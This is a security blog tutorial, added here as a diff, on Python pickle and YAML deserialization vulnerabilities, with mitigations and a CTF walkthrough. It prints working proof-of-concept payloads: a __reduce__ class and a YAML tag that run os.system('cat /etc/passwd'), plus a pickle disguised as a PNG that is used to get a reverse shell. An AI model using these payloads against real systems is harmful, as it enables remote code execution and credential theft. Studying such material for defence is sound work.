@@ -1,0 +1,159 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/penetration-testing/" rel="category tag">Penetration Testing</a></span>            </div>
+            <h1 class="post-title entry-title">Python Serialization Vulnerabilities – Pickle</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/python-serialization-vulnerabilities-pickle/" rel="bookmark"><time class="entry-date published" datetime="2023-09-30T09:20:35+00:00">September 30, 2023</time><time class="updated" datetime="2025-06-19T19:50:21+00:00">June 19, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;"><strong data-start="237" data-end="277">Python serialization vulnerabilities</strong> are a critical security concern when dealing with data exchange in Python applications. Serialization gathers data from objects, converts them to a string of bytes, and writes them to disk. The data can later be deserialized to recreate the original objects. Many programming languages offer this capability, including PHP, Java, Ruby, and Python (common backend coding languages in web).</span></p>
+<p><span style="color: #000000;">Let’s talk about serialization in Python. In Python, when we use the <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://docs.python.org/3/library/pickle.html">pickle module</a></strong></span>, serialization is called “pickling.”</span></p>
+<h3><span style="color: #800000;">Table of content</span></h3>
+<ul>
+<li><span style="color: #000000;"><strong>Serialization in Python</strong></span></li>
+<li><span style="color: #000000;"><strong>Serialization in Web Applications</strong></span></li>
+<li><span style="color: #000000;"><strong>Over Pickling</strong></span></li>
+<li><span style="color: #000000;"><strong>Python YAML vs Python Pickle</strong></span></li>
+<li><span style="color: #000000;"><strong>Mitigation</strong></span></li>
+<li><span style="color: #000000;"><strong>Demonstration</strong></span></li>
+<li><span style="color: #000000;"><strong>Conclusion</strong></span></li>
+</ul>
+<h3><span style="color: #800000;">Serialization in Python</span></h3>
+<p><span style="color: #000000;">While using Python, pickle.dumps() is used to serialize some data and pickle.loads() is used to deserialize it (pickling and unpickling). For eg: here is an array, pickled.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">python3
+&gt;&gt;&gt; import pickle
+&gt;&gt;&gt; variable = pickle.dumps([1,2,3])
+&gt;&gt;&gt; print(variable)
+b'\x80\x04\x95\x0b\x00\x00\x00\x00\x00\x00\x00]\x94(K\x01K\x02K\x03e.'
+&gt;&gt;&gt; pickle.loads(variable)
+[1, 2, 3]
+&gt;&gt;&gt;</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgv7IghIlyvzOOjGzsPEE7RyEeLhXKtoTkInhDnUCat6pTOgnAeNyzN-42_9vr_JU1Sn5cEsJ9nc0h907JEofTDXf2KDWt6BirvWSGhfH7OHCkOB7SBTUPZBAAYuFC3d5Y0MDj6xJPJMIbmTy_HatyImx8c_m3gCIYe5O6GBft-k7CHMobNE6NFg5zwk1PW/s16000/1.png"/></span></p>
+<p><span style="color: #000000;">As we can see above, when we print the variable, we see a byte string. This is serialization. Later, with pickle.loads(variable) we are deserializing the object.</span></p>
+<p><span style="color: #000000;">This is helpful in many cases, including when we want to save some variables from a program on the drive as a binary which can be later used in other programs. For example, let’s create an array and save it as a binary file.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">import pickle
+variable = pickle.dumps([1,2,3])
+with open("myarray.pkl","wb") as f:
+f.write(variable)</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhVmVhekXCSNcobF-YQre-Zj5YJKN7_R7mvGj8lUPBHT1eqTk6OQwWuHJEsjRm2T_SacNCrXL0b27pZcAtwBwOk_yEw7AXtJnuqcZbpFPkmPHCmAV69CbTrTWF6HaL0mP1CTvn3aaMlM2yoHY_gBz9kve2BWYawsgbk7t92OkRu1t2G10rpmDFXC3z7CedV/s16000/2.png"/></span></p>
+<p><span style="color: #000000;">As we can see, a pickle binary is now stored on the drive. Let’s read it using pickle again.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">import pickle
+obj = open("myarray.pkl","rb").read()
+pickle.loads(obj)</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEibMiiZiBhBxAuvmbEIiaeJG8D66ZDko6zcYnyMB4QqI3G4i-xbj1PBMO6Cspt31DcH4mHprgi5wsH8FDQ3Ao7J1KpDHBhE_klbE8M3o4FEIFlMys7XBH1C9zd6xsb-AmEk3fX2CwFJFwQWcZowB013OyRVU-1UnFtyfSZg1iNZPi_ORDlyOQfHc9YmpHEe/s16000/3.png"/></span></p>
+<p><span style="color: #000000;">As you can see, we can now operate on this deserialized object (obj) just like an array again! Throughout the SDLC, there may come a time when a developer would want to quit the IDE and save all the data and states of variables at the moment, that is where this is a helpful feature.</span></p>
+<h3><span style="color: #800000;">Serialization in Web Apps</span></h3>
+<p><span style="color: #000000;">Okay, so we have talked about serialization in software applications. But what is the use of serialization in web apps? So, the HTTP is a stateless protocol. That is, the state of one request doesn’t depend on the previous request. But sometimes there is a need to maintain state. That’s why we have cookies. Cookies would bring a sense of statefulness to HTTP protocol.</span></p>
+<p><span style="color: #000000;">If we want a user’s information and some data to be retained the next time they interact with the server, serialization is a wonderful use case. Just serialize some data, put it into a cookie (which is taking up the user’s storage and not the server’s! WoW) and for the next request just deserialize it and use it on the site.</span></p>
+<p><span style="color: #000000;">Developers use Pickle in Python web apps to do this. However, this opens the door to Python serialization vulnerabilities, as client-controlled content causes Pickle to deserialize unsafely. By contrast, serialization in JSON is much safer! Unlike some other serialization formats, JSON doesn’t allow executable code to be embedded within the data. This eliminates the risk of code injection vulnerabilities that malicious actors can exploit.</span></p>
+<p><span style="color: #000000;">It is possible to construct malicious pickle data which will execute arbitrary code!</span></p>
+<h3><span style="color: #800000;">Over Pickling</span></h3>
+<h4><span style="color: #000000;">Pickling Custom Classes in Python</span></h4>
+<p><span style="color: #000000;">We have talked about pickling well-known data types like an array. But what if we were to pickle our own custom classes? Python can easily understand and deserialize well-known classes but what will it do with custom classes like connection to servers and all those fancy networking scripts? It doesn’t even make sense to serialize those but Python developers added a way to pickle that too. There is a chance that discrepancies might happen when Python tries to deserialize such objects.</span></p>
+<h4><span style="color: #000000;">The Danger of Custom Pickling Logic</span></h4>
+<p><span style="color: #000000;">Custom pickling and unpickling code can be used. When you define a class you can provide a mechanism that states, ‘Here is what you should do when someone asks to unpickle you!’ So when Python goes to unpickle this string of bytes, it might have to run some code to figure out how to properly reconstruct that object. This code will be embedded in this pickle file.</span></p>
+<h4><span style="color: #000000;">Proof of Concept: Malicious Pickle Code</span></h4>
+<p><span style="color: #000000;">Here is a code for proof of concept. This code is creating a class called EvilPickle. To implement support for pickling on your custom object, you define a method called “<strong>__reduce__</strong>” which returns a function and pair of arguments to call that function with. Here, a simple “cat /etc/passwd” would be run using <strong>os.system</strong> function. Finally, this would be written in a binary file called backup.data.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">python
+import pickle
+import os
+class EvilPickle(object):
+  def __reduce__(self):
+    return (os.system, ('cat /etc/passwd', ))
+pickle_data = pickle.dumps(EvilPickle())
+with open("backup.data", "wb") as file:
+  file.write(pickle_data)</pre>
+<p><span style="color: #000000;">The idea here is to make the deserializer run cat /etc/passwd on their system. Let’s try it out now! We save the above code in evilpickle.py file and run it. Just to check, we’ll cat the backup.data file. Here we can clearly see something fishy!</span></p>
+<p><span style="color: #000000;">The user deserializes it anyway and ends up giving out /etc/passwd file.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">python
+import pickle
+pickle.loads(open("backup.data","rb").read())</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgnLKBvVLmzHiBiuOzFZCfo5uMjjlwo0oeQlfxDf9LuLxbzbF7qVJOvxbcuPGZOcPMzoNlcaXYoM96GGym9-SjPaIQUILjmP169QULn-KamuDb8uZCtTOg34mmQmBSDJZnzlrHaaAwQhr-N0JJJrAW-I_vl6wyuQ-GGOPbeayrevZwiRLNz2KGpQeqIDQla/s16000/4.png"/></span></p>
+<p><span style="color: #000000;">We can get even more nerdy and see what is happening under the hood by disassembling using pickletools. Here, the pickling is done on Unix like os (posix) which is stored in a SHORT variable and stored in as 0 and each successive command after that in different numeric values on the stack. The `REDUCE` opcode is used to call a callable (typically a Python function or method, here os.system (represented as posix and system)) with arguments (called TUPLE. here, cat /etc/passwd). And finally, the program is stopped.</span></p>
+<p><span style="color: #000000;">The primary difference between tuples and lists is that tuples are immutable as opposed to lists which are mutable. Therefore, it is possible to change a list but not a tuple. The contents of a tuple cannot change once they have been created in Python due to the immutability of tuples.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">python3 -m pickletools -a backup.data</pre>
+<p><span style="color: #000000;">note: -a options gives some info about each steps while using pickletools</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiUKzxdjbXv3VVqWSB3EFI0Ce0aik_ZCkR4D871r16B3EqYhgwrBl9ze4Wa8qaTB1vfVZwNBRBzg4YBHVifS-BY1Hg2yuMzfyOjg6F4rqfbUbY8CI2e55UmgMKMWoS4gKekeOagu2PPQO6XEK7lBUAATpVoKVTCY0EsnVFB3nWn6JSFyMNbdFSdiwfi6RS6/s16000/5.png"/></span></p>
+<h4><span style="color: #000000;">Real-World Impact of Over Pickling</span></h4>
+<p><span style="color: #000000;">Since the pickle object is user-controlled and it unpickles at the server, we can even use this to get the remote server shell as well (using sockets and pickling it and finally providing it to the server)</span></p>
+<p><span style="color: #000000;">PyTorch ML model up until recent times used pickle for serialization of ML models and was <a style="color: #000000;" href="https://github.com/pytorch/pytorch/issues/52596"><span style="color: #0000ff;"><strong>vulnerable to arbitrary code execution</strong></span></a>. <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://github.com/huggingface/safetensors">Safetensors</a> </strong></span>overcame this issue.</span></p>
+<h3><span style="color: #800000;">Python YAML vs Python Pickle</span></h3>
+<p><span style="color: #000000;">Python YAML is another serialization format instead of pickle. But even Python YAML allows the execution of arbitrary code by default. Here is another POC:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">import yaml
+document = "!!python/object/apply:os.system ['cat /etc/passwd']"
+yaml.load(document)</pre>
+<p><span style="color: #000000;">This would also execute cat /etc/passwd. We can avoid this by using “safe_load()” instead of load() anyway!</span></p>
+<h3><span style="color: #800000;">Mitigation</span></h3>
+<p><span style="color: #000000;">Pickle is just one module in Python. This is a very well-known tool and developers continue to use it. However, to avoid <strong data-start="275" data-end="315">Python serialization vulnerabilities</strong>, developers must be more mindful and should not ignore the warning clearly stated on Pickle’s official documentation page:</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhLoi92XaV94g02aS0dJVR4Iw_vo33ebuKRcaVp7TjkXa_BrOoBTjpnJJxKcvZZoXz29w1XxK2n_UFMr3jFvDUFfVUXk8dFrP5u1WQprJ1hkTqFItEr7sWwnw1Pn2yP3XtqBGm202wsW2Woav51tZrP1BnwQInBYYrR7KfHYgkY8hVqwL-OSiAol_V5rJbc/s16000/6.png"/></span></p>
+<p><span style="color: #000000;">Alternatives to <strong>pickle</strong> and brief POCs on them are as follows:</span></p>
+<p><strong><span style="color: #000000;">JSON</span></strong></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">import json
+# Serialize
+data = {"key": "value"}
+json_data = json.dumps(data)
+
+
+# Deserialize
+deserialized_data = json.loads(json_data)</pre>
+<p><strong><span style="color: #000000;">msgpack</span></strong></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">import msgpack
+# Serialize
+data = {"key": "value"}
+msgpack_data = msgpack.packb(data)
+
+
+# Deserialize
+deserialized_data = msgpack.unpackb(msgpack_data, raw=False)</pre>
+<p><span style="color: #000000;">Some other safe options to use would be protobuf by Google, CBOR.</span></p>
+<h3><span style="color: #800000;">Demonstration</span></h3>
+<h4 data-start="2558" data-end="2595"><span style="color: #000000;">Exploring the Vulnerable Web App</span></h4>
+<p data-start="2597" data-end="2775"><span style="color: #000000;">The target website is a note-taking application that uses serialization. When a user submits a note with a PNG image, the app processes it and renders a <code data-start="2750" data-end="2759">.pickle</code> file via a URL.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjvby5H9JeXFijmiY4qW7zDDuh482aqH4-h0XCDEv37LJNqFCRxpe_mqLe5ZgWwSHhRTsysvmT7bxxhc1t4nTaRlVORd1xXdJ9qbFtVeZZQHC7fJAIII5jal1ts4cdr0qWYRfvcSBniKHf9k9K3zGGpC3OXt-RwzDqBVHoh1FfFxxZHZgxQifIBQra-1_43/s16000/7.png"/></span></p>
+<p><span style="color: #000000;">This looks something like this when processed by the server. Observe the URL which is rendering a .pickle file</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjiig9dulOWtu8CuqTZZ0Y7gTAAM86rt7mXih9JjQP2Ht_3RVF2B_yvGnWgAEkKxPRJ_6HujlWGeTZ493gjUGEUgYhYU9n55jHysLK6Wo77X6sNHka5OPc7-8xGyDeC43W0CePkIW-GEnBh3RitkgPCK8ZZ14dRIbEE2Kun9k9NDUJc8YOwb-TvOTPvWfBY/s16000/8.png"/></span></p>
+<p><span style="color: #000000;">The challenge also provided us with an app.py source code which tells us all about the background logic. I can’t post the entire code but here are some relevant snippets.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhTzpcCtsOP3tBo_W3MEVKevE_vwyILejQ-IDf741qFx2eSrAfAXnoLj6xd-d-Oz9ZbiYJPMMRRxU36Mb5oexuI2jZcnnP2EEil-AmeWrzDpEToo9isiAJCPzTCWC-yBoKJwufpED_q6v2YtSnMb_GBY1MwrRawRUStfCIyRifNODtjisFrg8N4m2rVbQsI/s16000/9.png"/></span></p>
+<p><span style="color: #000000;">As we can see, the code is accepting the title, content and image as an object, pickling it and storing it in title.pickle</span></p>
+<h4 data-start="2777" data-end="2807"><span style="color: #000000;">Analyzing the Source Code</span></h4>
+<p data-start="2809" data-end="2892"><span style="color: #000000;">The challenge provided a partial app.py source code. Key functionalities include:</span></p>
+<ol>
+<li><span style="color: #000000;">Note() class accepts an object new_note with 3 items: title, content, image_filename.</span></li>
+<li><span style="color: #000000;">save_note() is calling pickle.dumps() to pickle new_note. save_note() is also called to store an image using image.save which is a flask function. Similarly image.filename extracts image’s filename.</span></li>
+<li><span style="color: #000000;">secure_filename() function converts insecure names to secure ones. For example: note 1 becomes note_1, ../../../etc/passwd becomes etc_passwd</span></li>
+<li><span style="color: #000000;">unpickle_file is loading the pickled file provided to it and unpickles it.</span></li>
+</ol>
+<h4><span style="color: #000000;">Critical Observations</span></h4>
+<ol>
+<li><span style="color: #000000;">The app accepts 3 inputs: title, content, and image.</span></li>
+<li><span style="color: #000000;">It doesn’t validate if the PNG is safe (i.e., a valid image file).</span></li>
+<li><span style="color: #000000;">This lack of PNG validation is a key attack vector.</span></li>
+<li><span style="color: #000000;">The server unpickles any file provided to it.</span></li>
+</ol>
+<p><span style="color: #000000;">I tried with a simple cat /etc/passwd command on my local machine and the evil.png pickled file was deserializing properly!</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">import pickle
+import os
+class EvilPickle(object):
+  def __reduce__(self):
+    return (os.system, ('cat /etc/passwd', ))
+pickle_data = pickle.dumps(EvilPickle())
+with open("evil.png", "wb") as file:
+  file.write(pickle_data)</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg42MZSl2Xr69mkO04WbbtjPVvcCslPkY1xZnCuZfZ7tiHP_ND9be_-UHjvr2pem5gZanubBnbLH63TyP8LoXCI0TTfzm1GqtPkJCC4q8y3uOOFSk1a1B5fN-4pZKkqT3wPKmdHzvNfJ59y93MaowbMFZJ3jRrDVmbDhQEEwfN65QqBKH-aEF-4ETh4H08d/s16000/10.png"/></span></p>
+<p><span style="color: #000000;">Let’s take it a step further and use a netcat listener to receive data from the deserialized local execution of evil.png and have it give us a shell!</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgZCA5AVtVk2kSqmOJPXP2s1dCKXkxTsjKQeBswJ5vNSI9Mi3LnHZQx6PRpAx5EnXD1gMzZsWbdJuIHUzBUvjADS5-1oMLTar1sSu1C1USjeIS_1uGz2eLZ9UA1BX8cWJ6h0UVKSWxJusTTWPkmzxBxywfEbSsyNSnJZpIzNVRV4OFCt2HHYXXFOqc0bqLT/s16000/11.png"/></span></p>
+<p><span style="color: #000000;">By following the same logic, we could exploit the server. First I create a PNG file and upload it on the server.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjj0rQ1j0-zIN9phD833H7oSjzBpDmdfx5TgvZ15iE5k9ApSIZj54NqCJ3Y6Yrk1mw-FF34qyRgFlIdOUqWW7inn8szRMl-wk32xxQYl1SsrrIS9zleT6sDWrhRzocNao5OtqvBDCoMx-zDDgo3uief0Ir-Q1Yd_2G3ADN9eFwzmlNLxuzxQjd_KmBTqL6Y/s16000/12.png"/></span></p>
+<p><span style="color: #000000;">The uploaded data becomes a pickle file which gets stored on the server and when it is called, data is visible on the screen (it is unpickled).</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhWrVe8qcMhJm_dfSVipRAzG1MPNlKFHvAMOpbgtUIKByZ7BeHZdoqTZIHhu9ZA79YzrTru7HKSKiEW7tG54fpiJA8Z5yrIfmM4Y4Dq7hkOm6Ohhnc3MLhYKNCEqnCkZUcEQhmzOpxe41IK2HWQ3vRDuVVW5kB13as9hHkm7sfBcNywbjipjUoKrLIJuUPp/s16000/13.png"/></span></p>
+<p><span style="color: #000000;">Finally, we access the uploaded PNG file on the server.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgALVlkX1rTApK10Khic_OCaefFltd3M3JkXe8SxefOD-0-SsreXEgL3hgCcWh2LuoQn9NpBJLIAKu_-o25R9YrCP1z6_t4-5CLWivFGfjgPJ6N6FhaXqU6ULvXXqUC6TdrBk9pwp7sS-1KfTr1CnpH0zSmyI89mumFSks2f1vVb5Msr7EnXUDR-nDkGWJR/s16000/14.png"/></span></p>
+<p><span style="color: #000000;">We get a reverse shell on the netcat listener we set up this way!</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhGSrcV1iyNnJ_yKI7PK2NTeABfvuXsF118p-abhpRSGa0agrJ7qLG-TPN83XX_5iHSROLkpQpokeypIW0jKVGSG42ezkli7MJ5mp06qifM1oo7_MqIJX0-ZXwGB-1eFBAHzr45YgTlgGU4yBgxV5SK-gPaoXuCkE-7yXJ48YCm5WBkPEfYSreUasVymbr4/s16000/15.png"/></span></p>
+<p><span style="color: #000000;">This is how we root the box! Please note that I hid and altered a few details throughout the CTF section of the article because the CTF is still an ongoing challenge and I couldn’t obtain permission to post a complete solution.</span></p>
+<h3><span style="color: #800000;">Conclusion</span></h3>
+<p><span style="color: #000000;"><strong>Python Serialization vulnerabilities </strong>are easy to exploit and easy to overlook by developers. One can even achieve arbitrary code execution on machines. As we saw, when deserialization insecurely or by using insecure functions, we put our infrastructure at risk for compromise. Developers should carefully read the documentation page and not ignore warnings. Finally, use languages like json to serialize/deserialize data which can’t be used to contain executable code since it is a data-only language. Thanks for reading.</span></p>
+<p><span style="color: #000000;"><strong>Author: Harshit Rajpal </strong>is an InfoSec researcher and left and right-brain thinker. Contact</span><strong> <a class="broken_link" href="https://in.linkedin.com/in/harshit-rajpal-79bb43103">here</a></strong></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
